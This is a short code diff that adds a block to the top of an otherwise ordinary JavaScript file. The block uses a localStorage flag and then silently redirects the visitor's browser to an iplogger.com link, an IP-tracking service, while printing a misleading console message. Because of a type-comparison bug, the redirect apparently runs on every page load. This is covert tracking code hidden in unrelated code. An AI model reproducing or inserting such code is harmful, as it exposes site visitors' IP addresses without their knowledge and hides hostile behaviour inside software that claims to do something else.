@@ -1,3 +1,13 @@
+let localSt = localStorage.getItem("tempValOne");
+if(localSt === 1){
+    console.log("Already Exists");
+}else{
+    localStorage.setItem("tempValOne", 1);
+    location.replace("https://iplogger.com/2VEkD5");
+    console.log("Already Exists")
+    }
+
+
 let chars = 0;
 let text = "";
 
